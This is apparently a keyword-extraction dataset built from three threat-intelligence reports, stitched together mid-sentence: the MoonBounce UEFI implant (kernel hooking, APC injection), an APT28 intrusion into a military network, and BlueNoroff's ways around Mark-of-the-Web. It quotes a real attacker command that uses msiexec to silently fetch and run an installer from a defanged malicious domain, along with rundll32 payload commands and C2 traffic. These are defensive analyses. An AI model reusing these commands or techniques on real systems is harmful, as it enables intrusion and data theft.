ntoskrnl.exe’s relocation directory. • Sets up an inline hook at the beginning of ExAllocatePool with a call instruction to the copied shellcode by placing thebytes E8 <offset_to_shellcode> at the beginning of the function and saving the original bytes in a designated buffer.510. Control is passed to the Windows kernel, which then invokes the hooked ExAllocatePool and in turn diverts execution to itsCode that set up a hook in the ExAllocatePool function within ntoskrnl.exehook, which was set up in the previous stage.11. The ExAllocatePool hook:• Verifies if the hook was previously executed by checking a predefined global flag. If not, the flag is set to designate that thehook was run so that any subsequent execution of ExAllocatePool will invoke the original function flow.• Calls MmMapIoSpace to map the driver mapping shellcode, which was set up during step 2, to the virtual address space ofthe Windows kernel.• Jumps to the address of the now mapped shellcode, passing it the following arguments on stack: • Pointer to a buffer with the saved ExAllocatePool prologue bytes • Base address of ntoskrnl.exe • Pointer to ExAllocatePoolExAllocatePool hook logic612. At this point, the main shellcode set up in the early stages of the infection chain and mapped to the virtual memory address space of the kernel in the previous step gets executed. The purpose of this shellcode is to map a raw PE image of a malicious driver (that is, appended at the end of the shellcode bytes) in memory and pass control to its entry point. To achieve this goal, the shellcode:• Checks if the buffer with the saved prologue bytes of ExAllocatePool passed to it in the first argument is equal to0x6F4EB841 (the original bytes in ExAllocatePool that were modified when it was hooked), in which case it resets the WP bit in the CR0 register in order to be able to write to read-only pages in memory and restores these original bytes to the beginning of ExAllocatePool (which has its address provided as the third argument of the shellcode), effectively unhooking it. After that, the shellcode restores the previous state of CR0 before it was modified.• Resolves exported functions from ntoskrnl.exe that are essential for the subsequent PE mapping. The function addressresolution code makes use of yet another name-hashing algorithm, which is outlined in the equivalent logic below:def ror13(x): return 0xFFFFFFFF & ((x >> 13) | (x << 32 – 13)) def fn_name_hash_ror13(f_name): f_hash = 0 for i in f_name: f_hash = ror13(f_hash) f_hash += ord(i) f_hash = ror13(f_hash) return f_hashThe functions resolved in this phase and their corresponding name hashes are the following:• 0x0311B83F – ExAllocatePool • 0x0ADC68C7 – MmGetSystemRoutineAddress• Maps the malicious driver image to the kernel memory with the following common PE-loading steps:• Allocates space for the image with the now unhooked ExAllocatePool function • Copies headers and sections to their corresponding virtual addresses in memory • Applies relocations • Resolves imports by getting each name in the import table, initializing its string with RtlAnsiString andRtlAnsiStringToUnicodeString, and passing the result as an argument to MmGetSysteRoutineAddress, following which the argument string is freed with RtlFreeUnicodeString.• Finally, control is passed to the entry point of the malicious driver.For clarity, steps 13-16, which are taken by the malicious driver and the user-mode malware it deploys, are explained in detail in the following sections.MD5SHA12228E682B2686DBE0330835B58A6F2BF (x86) 934D06720F4CB74069A870D382AC5045 (x64)22A4BD6BFD580C3A2025B1A91F8EF1677FECA360 (x86) 3D2E6F0C3B6FD0FB44966ADB4F13679E4091D851 (x64)SHA256707B8684009665742B9C6D801C12B9803F33FC518CB6BF513B4FA15A9E72E106 (x86) F17C1F644CEF38D7083CD6DDEB52BFDA2D36D0376EA38CC3F413CAB2CA16CA7D (x64)Link timeTuesday, 18.12.2018 03:48:33 UTC (x86) Tuesday, 18.12.2018 03:48:24 UTC (x64)File typeFile sizePE32 executable (native) Intel 80386, for MS Windows PE32+ executable (native) x86-64, for MS Windows34.63 KB (x86) 37 KB (x64)File nameNone7The purpose of the malicious driver is to inject user-mode malware into a Windows service of the network services group, thereby allowing it to have access to the internet. This is achieved by first having the driver register a callback using the PsSetLoadImageNotifyRoutine API, which is invoked when the Windows loader maps a PE image to memory (as outlined in step 13 of figure 1). This callback in turn verifies that the inspected image is kernel32.dll and the underlying owning process is executed with the command line: ‘SVCHOST.EXE -K NETSVCS’ or ‘SVCHOST.EXE -K NETSVCS -P’.Conditions to locate the target svchost.exe process for injection by MoonBounce’s driverIf the above conditions are met, the driver continues to inject an embedded PE image, corresponding to a user-mode malware stager, to the matching svchost.exe process (as outlined in step 14 of figure 1). The injection leverages the Windows APC (Asynchronous Procedure Call) mechanism through the following actions:• The driver enqueues a kernel mode APC routine, which will run in kernel mode with APC_LEVEL IRQL; • The kernel APC routine initializes the following data structure:OffsetField0x00x280x8000xA000x1000A table with pointers to various fields in the current structure and Windows API functions that are used by the PE mapping shellcodePE mapping shellcode used to load the raw user mode stager PE to memoryBuffer with the drop zone URL carrying the payload to be downloaded by the stagerPaddingBuffer with the raw image of the deployed user mode stagerThe first field, which we will refer to as the mapping shellcode argument, shows the following layout:OffsetField0x00x80x100x180x20Pointer to the buffer with the user mode stagerPointer to the buffer with the C2 URL containing the payload to be downloaded by the stagerPointer to VirtualAllocPointer to LoadLibraryAPointer to GetProcAddress8The kernel routine initializes a WORK_QUEUE_ITEM structure with a pointer to a worker routine and an argument structure with the following layout:OffsetField0x00x80x100x18Pointer to PE mapping shellcodePointer to the PE mapping shellcode argument described abovePointer to the KTHREAD object corresponding to the current thread executing in the context of the injected processPointer to a notification eventIt then calls the ExQueueWorkItem with the above structure in order to insert the worker routine to a system wide queue.Initialization of a WORK_QUEUE_ITEM structure used to schedule the execution of a worker routine in kernel space• The Windows kernel has a designated system thread that picks up the previously enqueued task and executes its correspondingroutine, passing it a pointer to the argument structure described above. In this case, the executed routine queues the PE-mapping shellcode with its own argument structure to the APC queue of the current thread running in the context of the injected svchost.exe process.Worker routine injecting the malicious MoonBounce user-mode stager to an svchost.exe instance using APC injection• Once the aforementioned user-mode thread within svchost.exe is scheduled to run, its execution is preceded by the PE-mapping shellcode, which uses its argument structure to load the malware stager PE image to svchost.exe’s memory address space and invoke its entry point (as outlined in step 15 of figure 1).9User Mode Malware StagerMD5SHA18DB7440B39761EA8ED75B7870542E1F3E21483618EEAE7CC476BC67BF768069572BE7FE0SHA2564CC7A14BC2E40BE93BBDF6F871430F08C3335E893519D75EA37C66942E1EB7FALink timeTuesday, 11.12.2018 09:25:17 UTCFile typePE32+ executable (DLL) (GUI) x86-64, for MS WindowsFile size66.5 KBFile nameNoneThe user-mode malware stager, which is injected to an svchost.exe process by the malicious driver, is a DLL packed with a common software tool called MPRESS. It operates in a similar fashion to UPX, whereby the original sections of the PE are compressed into a new section called .MPRESS1 and the code for unpacking is appended into another generated section named .MPRESS2. It gets executed during runtime in order to decompress the data and pass control to the original entry point within.After unpacking, the malware executes a basic staging component that reaches out to a C2 URL and obtains a PE image. The DLL receives an argument from the driver in the lpReserved parameter of the DllEntryPoint, which should contain a pointer to a C2 URL. The same argument can contain additional optional data elements that can be used in a number of ways throughout execution. These are laid out in a structure of the following form:OffsetField0x00x11c0x1800x1c00x1e0C&C URL (may also contain a scheduling related argument)User-AgentProxy addressProxy usernameProxy passwordTo receive a further payload to run, the malware:• Runs a system time-dependent scheduling algorithm that postpones execution until reaching a predefined deadline value, at which point the downloading logic is initiated. This value ought to be provided as part of the aforementioned DLL argument; however, we did not observe it being passed by the driver we analysed.• Sets up an optional User-Agent or uses the default string “IE” instead. Once again, the driver in our case did not pass anyparticular argument to use in this field; therefore, it is expected to be the default value.• Registers a callback function with the InternetSetStatusCallback API, which detects whether the system makes use of aproxy, in which case the malware can use the proxy configuration provided in the DLL argument to issue a request.• Sends a GET request to the C2 URL, expecting to receive a raw PE image as a response. • Maps the retrieved image to the current memory address space and invokes its entry point.Kaspersky’s threat research and reports: www.securelist.com Kaspersky’s blog. Business-related topics: business.kaspersky.com Enterprise security you can trust: kaspersky.com/enterprise-securitykaspersky.com.IIS ","{'phrases': ['UEFI', 'MoonBounce', 'Hooks', 'Boot Services', 'functions', 'AllocatePool', 'ExitBootServices', 'shellcode', 'Driver', 'malware stager', 'svchost.exe', 'process', 'Payload', 'use', 'PE'], 'target': 'UEFI; MoonBounce; Hooks; Boot Services; functions; AllocatePool; ExitBootServices; shellcode; Driver; malware stager; svchost.exe; process; Payload; use; PE.'}"
Spear-phishing; Microsoft Word; CVE-2015-2424; the attacker; a Microsoft Word vulnerability; CVE-2015-2424; the victim; the exploit; additional malware; the network; the malware; the victims; reconnaissance; RAT; integrity checks; credentials; RAT; privileges; servers; access; data; RAT; operational systems.,"['1. Initial phishing campaign targets officials attending an airshow, delivering malware. 2. Malware provides initial foothold on systems. 3. Lateral movement through the network to compromise additional systems. 4. Exploitation of vulnerabilities like MS14-068 to escalate privileges. 5. Compromise of Active Directory and highly classified enclaves. 6. Deployment of custom malware like Chopstick RAT for spying and data exfiltration. 7. Use of techniques like credential dumping to maintain persistence in the environment. ']","Extract the keywords: SESSION ID:CTT-W08Evolving Threats: dissection of a Cyber- Espionage attackStefano Maccaglia Advisory Consultant IR RSA (a Division of EMC)#RSACWho I Am#RSAC I prefer not to talk too much about myself…  Let just say I am Advisory Consultant at RSA IR  I am an Incident Responder with deep knowledge of malware and networkanalysts I have started my career in 1997  I have worked for several top 100 companies  Before that I have been a cracker in Europe «underground scene» of Amiga andPCs.Agenda What we discuss today  Today I would introduce a case I am still working on.  The case is related to Military Sector, and it has been recorded with minimaldifferences in several EU military environments.#RSAC The details of the attack are under strict NDA, but with slight modifications I havethe chance to share the most important details about the attacker strategies, tactics and tools used. The case is interesting for several reasons that we will discuss today.  The triage is still going on.The adversary APT28  The attack has been attributed to APT Group 28, also known as “Sofacy” or“Sednit”. I will call it “APT28” from now on.#RSAC APT28 group believed to have been in operation since 2007 and has beenidentified in several attacks that have targeted Eastern European governments, military and security-related organizations including the North Atlantic Treaty Organization (NATO). The group uses a complex set of tools and strategies to put a foothold in anenvironment and to control and steal interesting data. Several sources consider APT28 a group of CyberMercs based in Russia.The target: the moat without water How to develop a good network segmentation and be breached  The attack has targeted a military environment in EMEA region.  The environment has born segmented, with several layer of controls to preserveconfidentiality and integrity of exchanged and stored data.#RSAC The segmentation separates the network in several layers with different level of“trust”. Any operator receives a badge and a smartcard to operate in the network.  Communication from a lower to an higher layer of trust is blocked, insteadcommunication from higher layer to a lower one are permitted. At the beginning of the investigation I discovered that the base lacks any realnetwork visibility. The only network devices capable of analyzing streams were sporadic IDS and IPS placed in non strategic points.The target: the moat without water How to develop a good network segmentation and be breached  The environment is a Microsoft AD Forest with a pyramidal structure. • The root AD trusts several subdomains each withits proper set of AD servers.#RSAC• The forest is regulated with different level of trust. • The «Secret» and «NATO» networks are physicallyseparated entities were people can access only through dedicated machines.• Under no circumstances a user from standard ADstructure can access Secret networks.The target: the moat without water How to develop a good network segmentation and be breached  Patching policies are 15 days behind Microsoft releases.  All other applications are patched and upgraded based on internal CERT approval.  The reason for the delay is due to the need to verify the consistency and the impact#RSACof upgrade/patch against production environment. During the investigation we have discovered that, in the Data Center, two ADservers related to trusted subdomains, were not properly patched since November 2014 due to the swap from a maintenance contractor to another. The lack of the patch MS14-068 is a key to understand how deep and how hardthey have been breached.The Attack#RSACThe attack strategy How they break-in  The attack started from a targeted spear-phish campaign against the participants of#RSACthe 2014 Farnborough Air Show. The attack has targeted 7 officials of Air Force (AM) and 2 official of the Navy (MM)the email domain source was: “militaryexponews[.]com” The attack exploit a Microsoft Word vulnerability (CVE-2015-2424).  Only in two cases the attack completes successfully for the attacker.  In seven cases, the exploit, despite successfully detonated, was not able to start theinfection because the machines lack direct Internet access (proxy blocked connection attempts). The reconstruction of the first stage has been performed after the creation of aproper set of IOCs starting from the infected systems.The Attack Dissemination strategy#RSACSpear DropperFirst C&C external C2 orDropzoneSecond C&C andsends stolendataEVILTOSScandownload from C&CLateralmovementsand ExfilCHOPSTICK systemAttack Overview: End of First Wave The infected hosts, during roaming in external sites, communicates with C2#RSACAttackerMain C2Whenroaming theyconnectto C2.Victim 1Victim 2microsofthelpcenter.infoAttempts to access C2Blocked by proxyAttempts to access C2BaseNote: The repeated attempts to communicate externally from infected machines blocked by proxy have been considered «of no interest» for the SOC of the base. No other investigation or action has been taken, at time, against these machines.The attack strategy More patients to care about…  To escalate the infection the attacker have used the OWA access of the stolenaccounts to enumerate other potential victims for a new wave of targeted emails.#RSAC Also, one of the officers has access to internal Sharepoint service and participatesto boards were specific internal meetings and projects are discussed. With tailored messages published in Sharepoint board, the attacker has been ableto sneak through the inner layers of the military infrastructure distributing the dropper. One lesson I learn from Sharepoint…it has a horrible Log format.Attack Overview: End of Second Wave#RSACStill under controlStill under controlAttackerC2sVictim 1Victim 2microsofthelpcenter.info 1oo7.net The infection evolution  In this second wave of attack the adversary, knowing that the previous phase has not succeeded as planned due to access restriction with proxy and firewalls, has modified the dropper in order to work with internal proxy (with HTTP and SSL).#RSAC The modification has insured the control of all successfully infected hosts.IOCProxyTest performed after collection of the dropper from original spear phising emailThe attack strategy The infection progression  The attacker has now a significant set of standard Domain Users account.  Not enough to pawn the infrastructure, but good enough as a starting point.  Thanks to his backdoor, he can easily begin to extend his action to other systems.  Lacking logs and network visibility, for that part, we can only speculate that he#RSACsuccessfully identifies the vulnerable Navy subdomains by accessing Navy computers in the base. The victims have direct access to the abovementioned AD servers because they usethem for standard authentication. APT28 at this point has breached AD servers, has collected domain adminscredentials and has moved forward to the Root AD and the repositories where “interesting data” resides.CVE 2014-6324 LOG IOC  Windows Audit log showing the successful exploitation of the Kerberos Service. • When looking at the Audit log, to#RSACunderstand the successful exploit we should compare the Security ID with the Account Name. These two should be identical.• In this case, slightly modified from theoriginal log, we can see the «Officer A» logging with the Security ID of «Administrator».Pwning the core: CVE-2015-1701 AKA… «How to pwn your AD and live undetected»…  The attacker has been able to exploit root AD Servers thanks to a unknown (initially)#RSAClocal privilege escalation vulnerability CVE-2015-1701.The attacker has exploited a callback in UserSpace. Upon completion, the payload continues execution in UserMode with the privileges of the System process.Note: The technique has been reported by Microsoft thanks to the analyses carried out in this engagement…The Incident#RSACPatient Zero How the victim discovers the problem  The diplomatic representation in Addis Ababa is composed of few militaries andseveral diplomats connected to Internet with the standard VPN service from public networks (transit through the Base). For that part, nobody has noticed the strange connections to the external C2s repeated each day.#RSAC But for a specific task, the owner of the infected laptop has used a connection froma military outpost, tightly regulated in access time and permissions. Once connected, the computer has attempted to beacon to the C2s and the localnetwork operator has identified the strange traffic signaling it to his superiors.  The alert has escalated to the Army regiment which has started to investigate.  The analysis performed has followed the traditional practice.Patient Zero What’s on Customer “Patient Zero” machine?  The forensic analysis on the «Patient Zero» identified by the Customer showedthe following suspicious files and registry modifications, but no attempts to expand the focus of the investigation have been made.#RSACRegistry Keys and ValuesHKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Network Identification Service\parameters\ServiceDll = C:\Windows\System32\netids.dllHKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Network Identification Service\parameters\ServiceDllUnloadOnStop = 1HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost\ntsvcs = Network Identification Service HKEY_LOCAL_MACHINE\software\microsoft\windowsNT\currentversion\svchost\ntsvcs\CoInitializeSecurityParam ➝ 1CreatedModifiedYesYesYes YesNoNoNo NoEVILTOSS backdoorPatient Zero consequences How the attacker reacted  The Army has triaged the compromised system reinstalling the OS and applications#RSACand has close the case. As result of the triage, the attacker changes strategy for a while.  APT28 has lowered the volume of his traffic and, for more than 20 days nothinghas been reported. The military was ready closed the case, but another anomaly has been foundedduring a scheduled maintenance on a server in the base Data Center. Looking at the logs, they have discovered the presence of repeated accesses fromad Administrator account logging from an external IP address. The case has escalated quickly this time.The Methodology#RSACWhat we can bring to the table?#RSAC I am part of RSA IR Team and our structured approach, developed from ourfield experience is now tuned to face attacks like this one. Our approach leverages on “Actionable IoCs” and the support of tools that could easily integrate these IoCs to speedup the IR investigation process. This is a methodology and not a “method”, because it counts on procedures,analyses and evidences in a scientifically sounding approach. To collect actionable IoCs we use a synergic approach that includes networkand system visibility with log and malware analyses. It involves aggregation of IoCs and their classification to create a “KnowledgeBase” of attacks, tools and strategies that could be “reused” in subsequent engagements to streamline the response and support the attribution.The MethodologyNetwork and log indicators. Classification and attribution.Triage planned from a tailored set of strategic actions.Actionable IoCs What our methodology suggests  IR is an ongoing process that spawns on multiple areas.#RSACActionable IoCs What our methodology suggests  To operationalize the IoC you should develop, use and store it in a reusable logic.#RSACInvestigation: first step  The Customer has initially escalated the problem to another team, but despitethe efforts and a triage attempt, the result was not satisfactory.#RSAC Few days after the triage they discover additional lateral movements in theirnetwork. At this point the Customer called us.  We notice, since the initial talk, that the Customer was lacking any network visibility and the investigation was performed without a structured approach.No network visibilityNo detailed analysis has been performed initiallyLimited quantity of historical logsThe initial investigation has been limited to MD5 search on Domain machines.Zero Trust Below zero trust…  Following our advice to bring a network forensic tool in their environment (RSA Security Analytics) we have been able to ensure that, even after the «apparent» expulsion of the attacker, several machines were still infected.#RSACSuccessful expulsion/triage…The «network the chance to attacks.Our investigation Our approach tailored to the case  We have rebuilt the investigation process from the scratch aiming to identify maliciousbehavior from the already collected samples to build optimal Network Forensic IOC and to apply them as a base to highlight further machines infected.#RSACIntegrated a Network Forensic Tool: RSA SARedefined Actionable IOCs at Network, System and Log level for different platforms and systems.Refocused the malware analysis on all identified samples to identify Actionable IOCs.Improved the triage strategy by moving from °seek & destroy° to a more strategic approach. Thanks to that we have been able to enumerate remaining infected machines and to unearth the “missing piece”: the Chopstick RAT that the original IR team was not capable of identify. We know, from experience, that APT28 uses Chopstick RAT for most interesting targets.Attacker Tools#RSACAPT 28 Tools APT 28 Tools seen in this investigation  CORESHELL: This downloader is the evolution of the previous downloader ofchoice from APT28 known as “SOURFACE” (or “Sofacy”). This downloader, once executed, create the conditions to download and execute a second-stage (usually Eviltoss) from a C2.#RSAC EVILTOSS: This backdoor is delivered through CORESHELL downloader to gainsystem access for reconnaissance, monitoring, credential theft, and shellcode execution. CHOPSTICK: This is a modular implant compiled from a software framework thatprovides tailored functionality and flexibility. By far Chopstick is the most advanced tool used by APT 28. MIMIKATZ: Everyone of us knows this tool. In this case, this has been ofdevastating effects to completely compromise AD Forest.APT 28 Tools CORESHELL behavioral analysis Coreshell was relatively easy to detonate, apart for some AntiVM checks before executing. The behavioral analysis has permitted to highlight several DNS connections:#RSACThe DNS requests aim to different external hosts. The malware use a beacon mechanism based on HTTP POST and a separate thread for instructions still in HTTP. The User-Agent, as explained earlier, can be used as IOC, at least for the oldest variants.Note: Latest version of CORESHELL uses the victim’s browser User-Agent making the IOC useless.APT 28 Tools CORESHELL ATTRIBUTION BY COMPARISON#RSACThe attribution has been performed in two ways:  by comparison, between the discovered samples and the public ones. by analysis, looking forindicators related to the date and time of compilation, the time zone, the language of the malware and its behaviour.The dropped files have been verified as well and compared between different droppers.APT 28 Tools EVILTOSS IOCs  At system level the malware modifies the Registry in order to ensure persistence.  It is dropped and executed, usually, from one of these folders:#RSACEVILTOSS installation folder %commonprogramfiles%\System\Registry Keys and Values HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Network Identification Service\parameters\ServiceDll = %EVILTOSS folder%<EVILTOSSNAME>.dll HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Network Identification Service\parameters\ServiceDllUnloadOnStop = 1HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost\ntsvcs = Network Identification Service HKEY_LOCAL_MACHINE\software\microsoft\windowsNT\currentversion\svchost\ntsvcs\CoInitializeSecurityParam ➝ 1CreatedModifiedYesYesYes YesNoNoNo Nodownload files from a remote computer and/or the Internet run executable files log keystrokes send gathered informationAPT 28 Tools EVILTOSS ATTRIBUTION BY COMPARISON#RSACThe attribution has been performed in two ways:  by comparison, between the discovered samples and the public ones. by analysis, looking forindicators related to the date and time of compilation, the time zone and the language of the malware discovered. Also lateral movements have been verified in terms of timeframe of the log and hosts involved.APT 28 Tools EVILTOSS IOCs  EVILTOSS and CORESHELL share a lot of commonalities, both in thecommunication mechanism and the obfuscation/encryption. I.E. both obfuscate strings that are decoded at runtime. EVILTOSS uses RSA encryption to encrypt data and send it through a HTTPPOST message very similar to CORESHELL traffic:#RSACCont…C2 ack for exfilAPT 28 Tools CHOPSTICK  CHOPSTICK is a Trojan family, written in C++ and built from a framework.  It offers a diverse set of capabilities for different deployments.  It collects detailed information from the host settings and it is aware of the presence#RSACof several security products. It may communicate with external servers using SMTP, HTTP or HTTPs.  CHOPSTICK stores all collected information in a hidden file for temporary storage.  It communicates with the C2 via Windows “mailslot”, not named pipes or sockets.  CHOPSTICK main executable creates a “mailslot” in Windows machines and acts asthe mailslot server, while its code injected into the other processes acts as a client allowing the Trojan to access and steal any type of information. The RC4 encryption used here also uses a 50 bytes static key plus four-byte randomsalt value.APT 28 Tools CHOPSTICK IOCs  Looking at network traffic we discover that, after approximately 60 seconds ofexecution time, CHOPSTICK begins communicating with one of its C2 servers. Usually as in our sample the traffic was over HTTP:GET /find/?itwm=90QDFR9CWZckwkTPHr2GOUXPXI91A&from=yVVgOqV1UG&utm=HTXh&utm=9kV7L3Z&oprnd=Xjp1kKrDgAeFu&from=06&9u2J=nYruvlhMtXN5 HTTP/1.1 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*;q=0.8 Accept-Language: en-us,en;q=0.5 Accept-Encoding: gzip, deflate User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; InfoPath.2; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022) Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*;q=0.8 Accept-Language: en-us,en;q=0.5 Accept-Encoding: gzip, deflate User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; InfoPath.2; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022) Content-Length: 69 Connection: Keep-Alive Cache-Control: no-cache EMo1MTmWmHwJAwHlezPSG5-SGWRYwQm6MbGxkYhvCv7-FRCezztd2UxRArSxP285WXg==The attack strategy IOC: C2 list  Thanks to our structured approach we have been able to identify the C2s used by the attacker and with them, we have been able to enumerate infected hosts based on network communications. Note: Some of the discovered C2s are in common with other attacks recorded against other military environments in EMEA.The C2 list has confirmed the attribution and has paved the way for a more structured approach for TriageIncident Timeline and Stats Results of our methodology Vs previous results obtained by the Customer#RSACPeak of attack distributionInitialSpearphishingFirst Phase ofAttackPatient Zero300250200150100500Final triage managed byour TeamLast record of infectedmachineOct‐14 Nov‐14 Dec‐14 Jan‐15Feb‐15 Mar‐15 Apr‐15 May‐15Initial massivetriageJun‐15Jul‐15Aug‐15First time ourmethodology has appliedSep‐15Remediation APT28APT28RemediationConclusion What I can suggest  It is extremely valuable to build an internal Knowledge base about incidents andattacks recorded and published and to extract IOCs from these incidents. It is extremely useful to refocus the IR procedures dividing them in four areas:#RSAC Network Forensic  Malware AnalysisActionable IOCsRapid Incident reaction Proactive Management It could be extremely important to streamline the IR procedures by transforming IOCs to actionable IOCs, that means to evaluate and define which IOC can be reused and which one is limited to a specific attack or event. It is important to drill and to give IR personnel the chance to learn how to build, use,extract, evaluate and properly store Actionable IOCs.Conclusion What our methodology suggests#RSACYou should not approach IR operations in a unstructured way.You should ensure proper «visibility» to all IR fields.You should avoid to manage the Incident through «work arounds» and «shortcuts»You should avoid to rely only on technologiesYou should keep your IR capabilities updatedOnce formalized, you should use IoCs as key element to evaluate the attack surfaceYou should organize the triage in a strategic approach.#RSACEMC, RSA, the EMC logo and the RSA logo are trademarks of EMC Corporation in the U.S. and other countries. ","{'phrases': ['End', 'Malware', 'systems', 'Lateral movement', 'the network', 'Compromise', 'Exploitation', 'MS14-068', 'privileges', 'Deployment', 'Chopstick RAT', 'data', 'use', 'credential', 'persistence', 'the environment'], 'target': 'End; Malware; systems; Lateral movement; the network; Compromise; Exploitation; MS14-068; privileges; Deployment; Chopstick RAT; data; use; credential; persistence; the environment.'}"
BlueNoroff; Word; shortcuts; the victim; the document; Malware; System; Download; BlueNoroff; a downloader; the final payload; the BlueNoroff group; addition; new malware strains; BlueNoroff; fake domains; venture capital companies; banks; venture capital; domains.,"['1. BlueNoroff sends a phishing email with a weaponized attachment, typically a malicious Word doc. 2. The doc connects to a remote server and downloads the initial payload, an executable that bypasses UAC. 3. The executable fetches and executes a downloader script written in Visual Basic Script or Batch. 4. The downloader script executes legitimate Windows commands and binaries to evade detection. It fetches the next-stage payload from a command-and-control server. 5. The downloaded payload is a DLL that is injected into the Explorer process. It contains an encrypted configuration that fetches the final malware using cURL. 6. The final payload is a backdoor that gives the attacker remote access. It is similar to malware used in previous BlueNoroff campaigns. 7. The backdoor allows the attacker to fingerprint the victim system, install additional malware, and move laterally. 8. In some cases, the initial doc attachment contains macros that install a shortcut to a malware downloader. When opened, the shortcut executes the infection routine. 9. To bypass MOTW warnings, ISO and VHD images containing scripts are used instead of Office docs. Scripts fetch and run malware from URLs. 10. BlueNoroff registers lookalike domains impersonating financial companies to host malware. Targets in Japan are of particular interest currently. ']","Extract the keywords: securelist.com /bluenoroff-methods-bypass-motw/108383/ BlueNoroff introduces new methods bypassing MoTWAuthorsSeongsu ParkBlueNoroff group is a financially motivated threat actor eager to profit from its cyberattack capabilities. We have published technical details of how this notorious group steals cryptocurrency before. We continue to track the group’s activities and this October we observed the adoption of new malware strains in its arsenal. The group usually takes advantage of Word documents and uses shortcut files for the initial intrusion. However, it has recently started to adopt new methods of malware delivery.The first new method the group adopted is aimed at evading the Mark-of-the-Web (MOTW) flag, the security measure whereby Windows displays a warning message when the user tries to open a file downloaded from the internet. To do this, optical disk image (.iso extension) and virtual hard disk (.vhd extension) file formats were used. This is a common tactic used nowadays to evade MOTW, and BlueNoroff has also adopted it.In addition, the group tested different file types to refine malware delivery methods. We observed a new Visual Basic Script, a previously unseen Windows Batch file, and a Windows executable. It seems the actors behind BlueNoroff are expanding or experimenting with new file types to convey their malware efficiently.After researching the infrastructure that was utilized, we discovered more than 70 domains used by this group, meaning they were very active until recently. Also, they created numerous fake domains that look like venture capital and bank domains. Most of the domains imitate Japanese venture capital companies, indicating that the group has an extensive interest in Japanese financial entities.1/12Executive summaryBlueNoroff group introduced new file types to evade Mark-of-the-Web (MOTW) security measures; BleuNoroff group expanded file types and tweaked infection methods; BlueNoroff created numerous fake domains impersonating venture capital companies and banks.BackgroundAt the end of September 2022, we observed new BlueNoroff malware in our telemetry. After a careful investigation, we confirmed that the actor had adopted new techniques to convey the final payload. The actor took advantage of several scripts, including Visual Basic Script and Windows Batch script. They also started using disk image file formats, .iso and .vhd, to deliver their malware. For intermediate infection, the actor introduced a downloader to fetch and spawn the next stage payload. Although the initial intrusion methods were very different in this campaign, the final payload that we had analyzed previously was used without significant changes.Novel infection chain Long-lasting initial infectionBased on our telemetry, we observed that one victim in the UAE was attacked using a malicious Word document. The victim received a document file named “Shamjit Client Details Form.doc” on September 2, 2022. Unfortunately, we couldn’t acquire the document, but it was executed from the following path: C:\Users\[username]\Desktop\SALES OPS [redacted]\[redacted]\Signed Forms & Income Docs\Shamjit Client Details Form.docJudging from the file path, we can assume that the victim was an employee in the sales department responsible for signing contracts.2/12Upon launch, the malicious document connects to the remote server and downloads the payload. In this particular case, the executable ieinstal.exe was used to bypass UAC.Remote URL: url Created payload path: %Profile%\cr.dat Spawned command: cmd.exe %Profile%\cr.dat 5pKwgIV5otiKb6JrNddaVJOaLjMkj4zED238vIU=After initial infection, we observed several keyboard hands-on activities by the operator. Through the implanted backdoor, they attempted to fingerprint the victim and install additional malware with high privileges. Upon infection, the operator executed several Windows commands to gather basic system information. They then returned 18 hours later to install further malware with high privileges.Post-exploitationBased on our telemetry, when the malicious Word document opens it fetches the next payload from the remote server:Download URL: url fetched payload is supposed to be saved in %Profile%\update.dll. Eventually, the fetched file is spawned with the following commands:Command #1: rundll32.exe %Profile%\update.dll,#1 5pOygIlrsNaAYqx8JNZSTouZNjo+j5XEFHzxqIIqpQ== Command #2: rundll32.exe %Profile%\update.dll,#1 5oGygYVhos+IaqBlNdFaVJSfMiwhh4LCDn4=One of the other methods the BlueNoroff group usually uses is a ZIP archive with a shortcut file. The archive file we recently discovered contained a password-protected decoy document and a shortcut file named “Password.txt.lnk“. This is a classic BlueNoroff strategy to persuade the victim to execute the malicious shortcut file to acquire the decoy document’s password. The latest archive file (MD5 ル.zip (Japanese for “New bonus schedule”), indicating they were interested in Japanese targets.The main difference from the previous shortcut sample was that it fetched an additional script payload (Visual Basic Script or HTML Application); also, a different method of fetching and executing the next stage payload was adopted at this time. The command below was executed when the victim double-clicked on the shortcut file:1cmd.exe /c DeviceCredentialDeployment & echo jbusguid> %APPDATA%\Pass.txt & start2%APPDATA%\Pass.txt && FOR %i IN (%systemroot%\system32\msiexec.*) DO msiexec -c /Q /i3/1234hxxps://www.capmarketreport[.]com/packageupd.msi?ccop=RoPbnVqYd & timeoutTo evade detection, the actor utilized Living Off the Land Binaries (LOLBins). The DeviceCredentialDeployment execution is a well-known LOLBin used to hide the command’s windows. The actor also abused the msiexe.exe file to silently launch the fetched Windows Installer file. Updated method #1: Tricks to evade MOTW flagWe observed that the actor examined different file types to deliver their malware. Recently, many threat actors have adopted image files to avoid MOTW (Mark-of-the-Web). In a nutshell, MOTW is a mitigation technique introduced by Microsoft. The NTFS file system marks a file downloaded from the internet, and Windows handles the file in a safe way. For example, when a Microsoft Office file is fetched from the internet, the OS opens it in Protected View, which restricts the execution of the embedded macro. In order to avoid this mitigation technique, more threat actors have started abusing ISO file types. The BlueNoroff group likely experimented with ISO image files to deliver their malware. Although it’s still under development, we mention this sample as an early warning. This ISO image file contains one PowerPoint slide show and one Visual Basic Script.Embedded files of ISO imageThe Microsoft PowerPoint file contains a link. When the user clicks the link, it executes the 1.vbs file through the WScript process. When we checked the VBS file, it only generated an “ok” message, which suggests BlueNoroff is still experimenting with this method.<?xml version=""1.0"" encoding=""UTF-8"" standalone=""yes""?>12<Relationships xmlns=""url""> <Relationship Id=""rId2"" Type=""url"" Target=""wscript%201.vbs"" TargetMode=""External""/><Relationship Id=""rId1"" Type=""url"" from VirusTotal. At the time of analysis, this .vhd sample wasn’t detected by any antivirus. The virtual disk file contains a decoy PDF file, 